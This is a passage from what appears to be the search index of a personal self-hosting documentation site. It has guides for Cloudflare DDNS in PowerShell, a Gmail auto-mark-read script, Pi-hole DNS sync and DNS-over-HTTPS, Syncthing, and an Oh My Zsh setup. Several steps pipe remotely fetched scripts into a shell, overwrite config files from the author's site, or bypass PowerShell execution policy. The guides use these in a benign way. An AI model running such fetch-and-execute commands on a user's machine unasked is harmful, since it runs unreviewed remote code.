zip file &amp; Unzip, rename the folder to DDNS-Cloudflare-PowerShell place in a directory of your choosing</p>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#config-parameters", "title": "Config Parameters", "text": "<p>Update the config parameters inside the update-cloudflare-dns_conf.ps1 by editing accordingly. See below for examples.</p> Option Example Description what_ip internal Which IP should be used for the record: internal/external dns_record ddns.example.com DNS A record which will be updated cloudflare_zone_api_token ChangeMe Cloudflare API Token KEEP IT PRIVATE!!!! zoneid ChangeMe Cloudflare's Zone ID proxied false Use Cloudflare proxy on dns record true/false ttl 120 120-7200 in seconds or 1 for Auto", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#optional-notifications-parameters-for-telegram", "title": "Optional Notifications Parameters for Telegram", "text": "Option Example Description notify_me_telegram yes Use Telegram notifications yes/no telegram_chat_id ChangeMe Chat ID of the bot telegram_bot_API_Token ChangeMe Telegram's Bot API Token", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#optional-notification-parameters-for-discord", "title": "Optional Notification Parameters for Discord", "text": "Option Example Description notify_me_discord yes Use Discord notifications yes/no discord_webhook_URL http://WebhookURL.com/asd/ Webhook URL from your Discord server settings <p>To generate a webhook URL, follow the official Discord instructions. </p>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#running-the-script", "title": "Running The Script", "text": "<p>Open cmd/powershell</p> <p>Example:</p> <pre><code>powershell.exe -ExecutionPolicy Bypass -File C:\\DDNS-Cloudflare-PowerShell\\update-cloudflare-dns.ps1\n</code></pre>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#automation-with-windows-task-scheduler", "title": "Automation With Windows Task Scheduler", "text": "<p>Example: Run at boot with 1 min delay and repeat every 1 min</p> <ul> <li>Open Task Scheduler</li> <li>Action -&gt; Crate Task</li> <li>General Menu</li> <li>Name: update-cloudflare-dns</li> <li>Run whether user is logged on or not</li> <li>Trigger</li> <li>New...</li> <li>Begin the task: At startup</li> <li>Delay task for: 1 minute</li> <li>Repeat task every: 1 minute</li> <li>for duration of: indefinitely</li> <li>Enabled</li> <li>Actions</li> <li>New...</li> <li>Action: Start a Program</li> <li>Program/script: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</li> <li>Add arguments: -ExecutionPolicy Bypass -File C:\\DDNS-Cloudflare-PowerShell\\update-cloudflare-dns.ps1</li> <li>ok</li> <li>Enter your user's password when prompted</li> <li>Conditions</li> <li>Power: Uncheck - [x] Start the task only if the computer is on AC power</li> </ul>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#logs", "title": "Logs", "text": "<p>This Script will create a log file with only the last run information Log file will be located as same directory as update-cloudflare-dns.ps1</p> <p>Log file name:</p> <pre><code>update-cloudflare-dns.log\n</code></pre>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#limitations", "title": "Limitations", "text": "<ul> <li>Does not support IPv6</li> </ul>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#license", "title": "License", "text": "", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#mit-license", "title": "MIT License", "text": "<p>Copyright\u00a9 3os.org @2020</p> <p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p> <p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p> <p>THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/gmail-mark-archived-mail-as-read/", "title": "Automatically Mark Archived Email as Read in Gmail", "text": "", "tags": []}, {"location": "automation/gmail-mark-archived-mail-as-read/#background", "title": "Background", "text": "<p>My preferred method of managing emails in Gmail is <code>Zero Inbox</code>. In short, emails in Inbox work as to-do list. The Inbox may contain important email i need to attend or a digital receipt from a payment I've made a minute ago. Since I know the content of that email the task is done and I archive it. This email will move from Inbox to All Mail or a dedicated label if you have automation rules.</p>", "tags": []}, {"location": "automation/gmail-mark-archived-mail-as-read/#the-problem", "title": "The Problem", "text": "<p>When using the <code>Archive</code> function email which weren't opened or marked as <code>Read</code> will show as number counter in All Mail or Dedicated Label. Since I'm done with those emails I have to manually mark emails as read. This is a tedious task and I don't want to do it manually</p>", "tags": []}, {"location": "automation/gmail-mark-archived-mail-as-read/#the-solution", "title": "The Solution", "text": "<p>Using Google Scripts We can create a personal <code>app</code> that will automatically mark emails as read when they are archived. This is a simple script that will run on Gmail and will mark emails as read when they are no longer in the inbox folder. You can choose how often you want to automatically mark archived email as read in gmail. This solution was tested on personal Gmail accounts and the Google Workspace Gmail accounts (as long you can grunt permission).</p>", "tags": []}, {"location": "automation/gmail-mark-archived-mail-as-read/#installation", "title": "Installation", "text": "<p>Make sure you are logged in to your Google account. Open Google Scripts and create a new project.</p> <p></p> <p>You will be prompted with a new windwos. Rename the project to <code>Automatically Mark Archived Email as Read</code>. Copy and repace the following code to the new project.</p> <pre><code>function markArchivedAsRead() {\n  var threads = GmailApp.search('label:unread -label:inbox', 0, 100);\n  GmailApp.markThreadsRead(threads);\n  var spamThreads = GmailApp.search('label:spam -label:inbox', 0, 100);\n  GmailApp.markThreadsRead(spamThreads);\n}\n</code></pre> <p>Your windwos should look like this:</p> <p></p> <p>Save the project.</p> <p></p> <p>After saving the project you should be able Run the script.</p> <p></p> <p>On the first run the script will ask you to give it the necessary permissions. Click <code>Review permissions</code> to continue.</p> <p></p> <p>Since the <code>app</code> is not signed you will be prompted with a warning. I's ok and safe. Click <code>Advanced</code>.</p> <p></p> <p>Click <code>Go to Gmail Mark Archived as Read (unsafe)</code> to continue.</p> <p></p> <p>At this point you will be prompted to grant the script <code>Automatically Mark Archived Email as Read</code> access to your Gmail account. Click <code>Allow</code>. This will alow the script to perform the actions you need.</p> <p></p> <p>If all went well you should see the log of the script as show bellow.</p> <p></p> <p>At this point we create a <code>Automatically Mark Archived Email as Read</code> script and grunt it the necessary permissions. NNow we want to automate the process. We can do this by creating a new timed trigger. Head over the <code>Trigger menu</code></p> <p></p> <p>Click <code>Add Trigger</code>.</p> <p>You will be prompted to select when and how the script will run. The following example will run the script every 5 minutes, and send a failure email report onece a week.</p> <p>Note</p> <p>The script may fail onces in a while. This is due to the fact it depends on Gmail's API. Unless you receive an email with hunders of failed attempts, you can ignore the email.</p> <p></p> <p>Note</p> <p>Update: Some people are reporting an error which says \"This operation can only be applied to at most 100 threads. (line 3, file \"Code\")\". To fix this, you have to manually do a search for \"is:unread\" and mark all of them as read before running the script, so that it starts with a clean slate. The script can only process 100 threads per run, so if you give it more than 100 on the first run,</p> <p>After creating the trigger you screen should look like this:</p> <p></p> <p>Now we whant to ensure that the script runs every 5 minutes. We can do this in <code>Execution</code> menu:</p> <p></p> <p>When 5 minutes passed from the point the trigger was created, the page log should look like this:</p> <p></p> <p>We are done with the installation and the configuration. You should already be able to see that some of the emails are marked as read.</p>", "tags": []}, {"location": "automation/gmail-mark-archived-mail-as-read/#limitations", "title": "Limitations", "text": "<p>Google's API is limited to 100 threads per request - a single script's run. This means that every 5 minutes it runs it will mark 100 emails as read. Since the script is run every 5 minutes, it won't take long to mark all emails as read automatically. If you aren't able to wait you can do it mark emails as read manually.</p>", "tags": []}, {"location": "automation/gmail-mark-archived-mail-as-read/#troubleshooting", "title": "Troubleshooting", "text": "<p>I've seen this script working without any issues for months, But suddenly you may receive an email with the <code>Automatically Mark Archived Email as Read</code> failing to run all the time. The reason is that the script <code>lost</code> the Gmail permissions. The solution is to run the script manually and grant the script the necessary permissions as the first time.</p>", "tags": []}, {"location": "automation/pihole-cloudflare-dns-sync/", "title": "Pi-hole Cloudflare DNS Sync", "text": "<p>Pihole Cloudflare DNS Sync Github Repository. Pihole Cloudflare DNS Sync Docker Hub Page.</p> <p> </p>", "tags": ["pi-hole", "docker", "dns", "cloudflare"]}, {"location": "automation/pihole-cloudflare-dns-sync/#description", "title": "Description", "text": "<p>Lightweight Container image based on python:3.9.13-alpine to be used in conjunction with a Pi-hole instance to sync the DNS records from Cloudflare DNS Service to Pi-hole local DNS.</p>", "tags": ["pi-hole", "docker", "dns", "cloudflare"]}, {"location": "automation/pihole-cloudflare-dns-sync/#supports", "title": "Supports", "text": "<ul> <li>A records</li> <li>CNAME records</li> <li>Any type of Pi-hole instance</li> </ul>", "tags": ["pi-hole", "docker", "dns", "cloudflare"]}, {"location": "automation/pihole-cloudflare-dns-sync/#requirements", "title": "Requirements", "text": "<ul> <li>Cloudflare API Readonly Token</li> <li>Pi-hole instance</li> </ul>", "tags": ["pi-hole", "docker", "dns", "cloudflare"]}, {"location": "automation/pihole-cloudflare-dns-sync/#creating-a-cloudflare-api-token", "title": "Creating a Cloudflare API token", "text": "<p>To create a CloudFlare API token for your DNS zone go to https://dash.cloudflare.com/profile/api-tokens and follow these steps:</p> <ol> <li>Click Create Token</li> <li>Select Create Custom Token</li> <li>Provide the token a name, for example, <code>example.com-dns-zone-readonly</code></li> <li>Grant the token the following permissions:    - Zone - DNS - Read</li> <li>Set the zone resources to:    - Include - Specific Zone - <code>example.com</code></li> <li>Complete the wizard and use the generated token at the <code>CLOUDFLARE_API_TOKEN</code> variable for the container</li> </ol>", "tags": ["pi-hole", "docker", "dns", "cloudflare"]}, {"location": "automation/pihole-cloudflare-dns-sync/#parameters", "title": "Parameters", "text": "Parameter Description Default Type Required CLOUDFLARE_API_TOKEN Cloudflare API Token change_me string Yes CLOUDFLARE_DOMAIN Cloudflare Domain example.com string Yes EXCLUDE_PROXIED_RECORDS Exclude Proxied Records yes string Yes PIHOLE_HOST Pi-hole hostname/IP 123.123.123.123 string Yes PIHOLE_PORT Pi-hole port 80 integer Yes USE_HTTPS http/https for pihole no string Yes PIHOLE_PASSWORD Pi-hole password change_me string Yes RUN_EVERY Run very x minute 5 integer Yes", "tags": ["pi-hole", "docker", "dns", "cloudflare"]}, {"location": "automation/pihole-cloudflare-dns-sync/#usage", "title": "Usage", "text": "<p>Docker run example:</p> <pre><code>docker run -d \\\n  --name pihole-cloudflare-dns-sync \\\n  -h pihole-cloudflare-dns-sync \\\n  --restart always \\\n  -v /etc/timezone:/etc/timezone:ro \\\n  -v /etc/localtime:/etc/localtime:ro \\\n  -e CLOUDFLARE_API_TOKEN=cloudflare_secret_dns_zone_api_token \\\n  -e CLOUDFLARE_DOMAIN=example.com \\\n  -e EXCLUDE_PROXIED_RECORDS=yes \\\n  -e PIHOLE_HOST=123.123.123.123 \\\n  -e PIHOLE_PORT=80 \\\n  -e USE_HTTPS=no \\\n  -e PIHOLE_PASSWORD=secret \\\n  -e RUN_EVERY=1 \\\n  -e PUID=1000 \\\n  -e PGID=1000 \\\nfire1ce/pihole-cloudflare-dns-sync\n</code></pre> <p>Docker compose example:</p> <pre><code>version: '3'\n\nservices:\n  pihole-cloudflare-dns-sync:\n    image: fire1ce/pihole-cloudflare-dns-sync\n    container_name: pihole-cloudflare-dns-sync\n    hostname: pihole-cloudflare-dns-sync\n    restart: always\n    network_mode: bridge\n    volumes:\n      - /etc/timezone:/etc/timezone:ro\n      - /etc/localtime:/etc/localtime:ro\n    environment:\n      - CLOUDFLARE_API_TOKEN=cloudflare_secret_dns_zone_api_token\n      - CLOUDFLARE_DOMAIN=example.com\n      - EXCLUDE_PROXIED_RECORDS=yes\n      - PIHOLE_HOST=123.123.123.123\n      - PIHOLE_PORT=80\n      - USE_HTTPS=no\n      - PIHOLE_PASSWORD=secret\n      - RUN_EVERY=1\n      - PUID=1000\n      - PGID=1000\n</code></pre>", "tags": ["pi-hole", "docker", "dns", "cloudflare"]}, {"location": "automation/pihole-cloudflare-dns-sync/#license", "title": "License", "text": "<p>This project is licensed under the GNU General Public License v3.0 - see the LICENSE file for details</p>", "tags": ["pi-hole", "docker", "dns", "cloudflare"]}, {"location": "automation/syncthings/", "title": "Syncthing", "text": "<p>Syncthing is a continuous file synchronization program. Syncthing is an application that allows you to synchronize files between multiple devices. This means that creating, editing, or deleting files on one computer can be automatically copied to other devices.</p> <p>Official website: syncthing.net</p>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/syncthings/#debianubuntu-installation", "title": "Debian/Ubuntu Installation", "text": "<p>We need to add the following <code>Syncthing</code> repository to the system.</p> <p>First, we need to add PGP keys to allow the system to check the packages authenticity</p> <pre><code>sudo curl -s -o /usr/share/keyrings/syncthing-archive-keyring.gpg https://syncthing.net/release-key.gpg\n</code></pre> <p>Then we will add the <code>stable Syncthing</code> repository channel to your APT sources</p> <pre><code>echo \"deb [signed-by=/usr/share/keyrings/syncthing-archive-keyring.gpg] https://apt.syncthing.net/ syncthing stable\" | sudo tee /etc/apt/sources.list.d/syncthing.list\n</code></pre> <p>Now we can update the package list and install Syncthing</p> <pre><code>sudo apt update\nsudo apt install syncthing\n</code></pre>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/syncthings/#configuration-syncthing-as-a-service", "title": "Configuration Syncthing as a Service", "text": "<p>Configuring Syncthing as a service will provide as the ability to start and stop and enable/disable the service at boot.</p> <p>Create a systemd unit file for managing the Syncthing service.</p> <pre><code>nano /etc/systemd/system/syncthing@.service\n</code></pre> <p>In the next example we will be setting the <code>Syncthing</code> service UI to listen on local host (127.0.0.1) and port 8384</p> <p>Add the following lines to the <code>syncthing@.service</code>:</p> <pre><code>[Unit]\nDescription=Syncthing - Open Source Continuous File Synchronization for %I\nDocumentation=man:syncthing(1)\nAfter=network.target\n\n[Service]\nUser=%i\nExecStart=/usr/bin/syncthing -no-browser -gui-address=\"127.0.0.1:8384\" -no-restart -logflags=0\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Save and close the file when you are finished. Then, reload the systemd daemon to apply the configuration:</p> <pre><code>systemctl daemon-reload\n</code></pre> <p>Next, start the Syncthing service with the following command depending on a user this example is <code>root</code></p> <pre><code>systemctl start syncthing@root\n</code></pre> <p>To verify the status of the Syncthing service, run the following command:</p> <pre><code>systemctl status syncthing@root\n</code></pre> <p>Finally, enabled the syncthing service on boot</p> <pre><code>systemctl enable syncthing@root\n</code></pre>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/syncthings/#macos-installation", "title": "MacOS Installation", "text": "<p>You can download the MacOS installation package from Syncthing Downloads, But my preferred way is to use the Homebrew package manager.</p> <pre><code>brew install --cask syncthing\n</code></pre>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/syncthings/#windows-installation", "title": "Windows Installation", "text": "<p>Window installation from Syncthing Downloads installs the Syncthing as a service without any system tray icon or menu.</p> <p>The best way I found is to use <code>SyncTrayzor</code> from SyncTrayzor Github Page. It hosts and wraps Syncthing, making it behave more like a native Windows application and less like a command-line utility with a web browser interface.</p> <p>You can also instal it win <code>winget</code> with the following command:</p> <pre><code>winget install SyncTrayzor.SyncTrayzor\n</code></pre>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/syncthings/#synology-dsm-installation", "title": "Synology DSM Installation", "text": "<p>In order to install Syncthing, we need to add 3<sup>rd</sup> party packages to Synology DSM. Synology Community Packages provides packages for Synology-branded NAS devices.</p> <p>After we added <code>Synology Community Packages</code> you will be able to install Syncthing from the <code>Cummunity</code> tab.</p> <p>Permissions for the Syncthing service will be handled by the new system user <code>sc-syncthing</code></p> <p></p>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/syncthings/#syncthing-configuration", "title": "Syncthing Configuration", "text": "<p>The following configuration are the same for all the installation methods. I'm no going to cover the basic configuration, but I will show you some of my personal preferences.</p> <p>First to configure the Syncthing we need to access it's Web UI. The Default url is http://127.0.0.1:8384</p> <p>If you are using <code>Syncthing</code> at remote Linux host, you can use SSH tunnel to access the Web UI.</p> <pre><code>ssh  -L 8001:127.0.0.1:8384 root@192.168.102.6\n</code></pre> <p>This will forward <code>127.0.0.1:8384</code> from the remote host to <code>127.0.0.1:8001</code> on the local host.</p> <p>For security reasons, I like to disable all the Discovery and Repay services.</p> <p></p> <p>When you disable the Discovery service, you will have to manually add the connection to other devices.</p>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/syncthings/#manual-connection-example", "title": "Manual Connection Example", "text": "<pre><code>tcp://192.168.1.1:22000\n</code></pre> <p>or</p> <pre><code>tcp://example.com:22000\n</code></pre> <p></p>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/syncthings/#syncthing-files-ignore-patterns", "title": "Syncthing Files Ignore Patterns", "text": "<p>Syncthing supports of <code>Ignore Patterns</code> you can use it to <code>Ignore Files</code> synchronization. This will save you a lot of headaches with sync errors</p> <p>Here is a list of the <code>Ignore Patterns</code> for system files:</p> <pre><code>// Apple macOS\n(?d).DS_Store\n(?d).localized\n(?d)._*\n(?d).Icon*\n(?d).fseventsd\n(?d).Spotlight-V100\n(?d).DocumentRevisions-V100\n(?d).TemporaryItems\n(?d).Trashes\n(?d).Trash-1000\n(?d).iCloud\n(?d)Photos Library.photoslibrary\n\n// GNU/Linux\n(?d).directory\n(?d).Trash-*\n\n// Microsoft Windows\n(?d)desktop.ini\n(?d)ehthumbs.db\n(?d)Thumbs.db\n(?d)$RECYCLE.BIN\n(?d)System Volume Information\n\n// QNAP QTS\n(?d).AppleDB\n(?d).@_thumb\n(?d).@__thumb\n\n// Synology DSM\n(?d)@eaDir\n\n// Adobe Lightroom\n*Previews.lrdata root-pixels.db\n\n// Dropbox\n.dropbox\n.dropbox.attr\n\n// Firefox &amp; Chrome\n*.part\n*.crdownload\n\n// Microsoft Office\n~*\n\n// Parallels Desktop for Mac\n.parallels-vm-directory\n\n// Resilio Sync\n.sync\n*.bts\n*.!Sync\n.SyncID\n.SyncIgnore\n.SyncArchive\n*.SyncPart\n*.SyncTemp\n*.SyncOld\n\n// Temporary and backup files\n*.temporary\n*.tmp\n*._mp\n*.old\n*.syd\n*.dir\n*.gid\n*.chk\n*.dmp\n*.nch\n.*.swp\n*~\n\n// Vim\n*.*.sw[a-p]\n</code></pre> <p>Example of working <code>Syncthing</code> Web UI:</p> <p></p>", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"]}, {"location": "automation/guides/better-terminal-experience/", "title": "Better Terminal Experience", "text": "", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/better-terminal-experience/#introduction", "title": "Introduction", "text": "<p>I have been using terminal for a long time, it's one of my essential tools for my everyday work and hobbies. The default terminal experience is not very user friendly, and I find it sometimes frustrating to use for basic tasks. So I decided to improve my terminal experience for macOS and Linux without too much effort from the user side. This guide will help you to install and configure the **better terminal experience in less than 5 minutes.</p> <p>Better Terminal Experience guide based on ZSH Shell with Oh My Zsh on top of it. Using built-in theme called <code>Bira</code>, zsh auto suggestions plugin that suggests commands as you type based on history and completions and zsh syntax highlighting plugin that highlighting of commands whilst they are typed at a zsh prompt into an interactive terminal.</p>", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/better-terminal-experience/#whats-zsh", "title": "What's ZSH", "text": "<p>Z-shell (Zsh) is a Unix shell that can be used as an interactive login shell and as a shell scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features.</p>", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/better-terminal-experience/#whats-oh-my-zsh", "title": "What's Oh-My-Zsh", "text": "<p>Oh My Zsh is an open source, community-driven framework for managing your zsh configuration.</p>", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/better-terminal-experience/#installation", "title": "Installation", "text": "<p>You can copy and paste the following code with <code>nano &lt;name_of_your_file&gt;.sh</code> <pre><code>#!/bin/bash\n\n# Install required packages\necho \"Installing required packages...\"\nif [[ $(uname) == \"Linux\" ]]; then\n    sudo apt install -y git zsh wget\nelif [[ $(uname) == \"Darwin\" ]]; then\n    brew install git zsh wget\nfi\n\n# Install Oh My Zsh\necho \"Installing Oh My Zsh...\"\nsh -c \"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\"\n\n# Change default shell to Zsh\nread -p \"Do you want to change the default shell to Zsh? (y/n)\" -n 1 -r\necho \"\"\nif [[ $REPLY =~ ^[Yy]$ ]]; then\n    chsh -s $(which zsh)\nfi\n\n# Clone plugins\necho \"Cloning plugins...\"\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting\ngit clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions\n\n# Configure Zsh\necho \"Configuring Zsh...\"\nsed -i 's/^ZSH_THEME=.*/ZSH_THEME=\"bira\"/' ~/.zshrc\nsed -i '/^plugins=(/c\\plugins=(git colored-man-pages docker docker-compose iterm2 node npm brew colorize macos pip pyenv virtualenv adb aws command-not-found zsh-autosuggestions zsh-syntax-highlighting)' ~/.zshrc\ncat &lt;&lt;EOT &gt;&gt; ~/.zshrc\n\n## Fix for Slow zsh-autosuggestions copy&amp;paste\nautoload -Uz bracketed-paste-magic\nzle -N bracketed-paste bracketed-paste-magic\nzstyle ':bracketed-paste-magic' active-widgets '.self-*'\nEOT\n\n# Personal theme\nread -p \"Do you want to install a personal theme? (y/n)\" -n 1 -r\necho \"\"\nif [[ $REPLY =~ ^[Yy]$ ]]; then\n    echo \"Installing personal theme...\"\n    wget -O ~/.oh-my-zsh/themes/3os.zsh-theme https://3os.org/assets/zsh/3os.zsh-theme\n    wget -O ~/.zshrc https://3os.org/assets/zsh/zshrc_config\nfi\n\necho \"Done! Please open a new terminal window to enjoy the Better Terminal Experience.\"\n</code></pre> Then you run  <code>chmod +x &lt;name_of_your_file&gt;.sh</code> Run the script <code>./&lt;name_of_your_file&gt;.sh</code></p>", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/better-terminal-experience/#requirements", "title": "Requirements", "text": "<ul> <li>git</li> <li>zsh</li> <li>wget</li> </ul> <p>Install the following requirements packages with the following commands:</p> Linux apt exampleMacOS homebrew example <pre><code>apt install -y git zsh wget\n</code></pre> <pre><code>brew install git wget zsh\n</code></pre>", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/better-terminal-experience/#oh-my-zsh", "title": "Oh My Zsh", "text": "<p>We can proceed to install Oh My Zsh with the following command:</p> <pre><code>sh -c \"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\"\n</code></pre> <p>Answer Yes when asked to change the default shell to zsh.</p> <p>Install Autosuggestions, Syntax-Highlighting Plugins using git clone:</p> <pre><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting\ngit clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions\n</code></pre>", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/better-terminal-experience/#configuration", "title": "Configuration", "text": "<p>Oh My Zsh crates a default configuration file called <code>.zshrc</code> in the user's home directory.</p> <p>We need to edit the configuration file. You can use any editor to edit the file.</p> <p>nano example:</p> <pre><code>nano ~/.zshrc\n</code></pre> <p>We need to add or change the following lines to the configuration file:</p> <p>Find the theme and change it to <code>bira</code></p> <pre><code>ZSH_THEME=\"bira\"\n</code></pre> <p>find the <code>plugins</code> and change it to the following:</p> <pre><code>plugins=(git colored-man-pages docker docker-compose iterm2 node npm brew colorize macos pip pyenv virtualenv adb aws command-not-found zsh-autosuggestions zsh-syntax-highlighting)\n</code></pre> <p>The autosuggestions plugin has a bug with copy and paste so there is a workaround for that. Append the following to the end of the config to activate the workaround.</p> <pre><code>## Fix for Slow zsh-autosuggestions copy&amp;paste\nautoload -Uz bracketed-paste-magic\nzle -N bracketed-paste bracketed-paste-magic\nzstyle ':bracketed-paste-magic' active-widgets '.self-*'\n</code></pre> <p>Save and exit the file. Open new terminal window and enjoy Better Terminal Experience!</p>", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/better-terminal-experience/#bonus-personal-theme-preconfigured", "title": "Bonus: Personal Theme, preconfigured", "text": "<p>I've made a personal theme 3os based on the Bira theme with some tweaks.</p> <p></p> <p>Danger</p> <p>The following commands will overwrite your current config if exists.</p> <p>Make sure you have a backup of your config before proceeding!!!</p> <pre><code>wget -O ~/.oh-my-zsh/themes/3os.zsh-theme https://3os.org/assets/zsh/3os.zsh-theme\nwget -O ~/.zshrc https://3os.org/assets/zsh/zshrc_config\n</code></pre>", "tags": ["macos", "linux", "terminal", "zsh", "oh-my-zsh"]}, {"location": "automation/guides/pihole-doh/", "title": "Pi-hole as DNS Server with DNS over HTTPS (DOH) Based on Docker Containers", "text": "", "tags": ["pi-hole", "doh", "docker", "dns", "dns-over-https"]}, {"location": "automation/guides/pihole-doh/#whats-pi-hole", "title": "What's Pi-hole?", "text": "<p>Pi-hole Official Website Official Website.</p> <p>Pi-hole is a DNS server that is designed to block ads and trackers. It is a free and open source software project. It's based on blocklists and acts as a DNS sinkhole.</p>", "tags": ["pi-hole", "doh", "docker", "dns", "dns-over-https"]}, {"location": "automation/guides/pihole-doh/#whats-dns-over-https-doh", "title": "What's DNS over HTTPS (DOH)?", "text": "<p>DNS over HTTPS (DoH) is an internet security protocol that communicates domain name server information in an encrypted way over HTTPS connections.</p>", "tags": ["pi-hole", "doh", "docker", "dns", "dns-over-https"]}, {"location": "automation/guides/pihole-doh/#my-pi-hole-setup", "title": "My Pi-hole Setup", "text": "<p>My setup fully depends on pi-hole dns server, that's why I use two servers one as primary DNS Server and the second as secondary DNS server.</p> <p>I've configured my router as a DNS server for all the DHCP clients with primary and the secondary DNS as my pi-hole servers. This way all the clients requests the router to resolve the DNS and the router forwards the request to the pi-hole servers.</p> <p></p> <ul> <li>Pi-hole-1 runs on ubuntu server (virtual machine)</li> <li>Pi-hole-2 runs on Raspberry Pi</li> </ul> <p>Warning</p> <p>This is not a step by step guide for all the configurations of pihole or how to use docker containers. The following instuctions include only the deployemt of the pi-hole server with DoH providers.</p>", "tags": ["pi-hole", "doh", "docker", "dns", "dns-over-https"]}, {"location": "automation/guides/pihole-doh/#installation", "title": "Installation", "text": "<p>We Will be using <code>docker-compose</code> to deploy the pi-hole server with DoH providers with a single configuration file.</p> <p>The following docker-compose.yml includes two images: Pi-hole container, and cloudflared container. When you run <code>docker-compose up</code> the containers will be created and started. I't will create internal network for the pihole and two instances of cloudflared. When a request comes in the pihole will forward the request to the cloudflared instances one of them will use Cloudflare DNS servers and the other will use Google's DNS servers. There is no need to configure the pihole's DNS server at the UI since the configuration is done by <code>docker-compose.yml</code> file.</p> <p>When using this setup two folders will be created on the Host machine for persistent storage of the containers: <code>config, dnsmasq.d</code>. Those folders will be mounted to the containers when its running/restarted/recreated. Those folders will be created at the root folder of the docker-compose.yml file.</p> <p>Create a folder for the deployment of the containers at your host machine. create a file named <code>docker-compose.yml</code> at the root folder and copy the following content to it:</p> <pre><code>version: '2.4'\n\nservices:\n  pihole:\n    container_name: pihole\n    hostname: pihole\n    restart: always\n    image: pihole/pihole\n    networks:\n      dns:\n        ipv4_address: 172.20.0.9\n    depends_on:\n      google-8.8.8.8:\n        condition: service_started\n      cloudflare-1.1.1.1:\n        condition: service_started\n    volumes:\n      - ./config:/etc/pihole/\n      - ./dnsmasq.d:/etc/dnsmasq.d/\n      - /etc/localtime:/etc/localtime\n    ports:\n      - '7003:80'\n      - '53:53/tcp'\n      - '53:53/udp'\n    environment:\n      - ServerIP=127.0.0.1\n      - WEBPASSWORD=ChangeMe\n      - PIHOLE_DNS_=172.20.0.10;172.20.0.12\n\n  cloudflare-1.1.1.1:\n    container_name: cloudflare-1.1.1.1\n    hostname: cloudflare-1.1.1.1\n    restart: always\n    image: visibilityspots/cloudflared\n    networks:\n      dns:\n        ipv4_address: 172.20.0.10\n    expose:\n      - '53/tcp'\n      - '53/udp'\n    environment:\n      - PORT=53\n      - UPSTREAM1=https://1.1.1.1/dns-query\n      - UPSTREAM2=https://1.1.1.1/dns-query\n    volumes:\n      - /etc/localtime:/etc/localtime\n\n  google-8.8.8.8:\n    container_name: google-8.8.8.8\n    hostname: google-8.8.8.8\n    restart: always\n    image: visibilityspots/cloudflared\n    networks:\n      dns:\n        ipv4_address: 172.20.0.12\n    expose:\n      - '53/tcp'\n      - '53/udp'\n    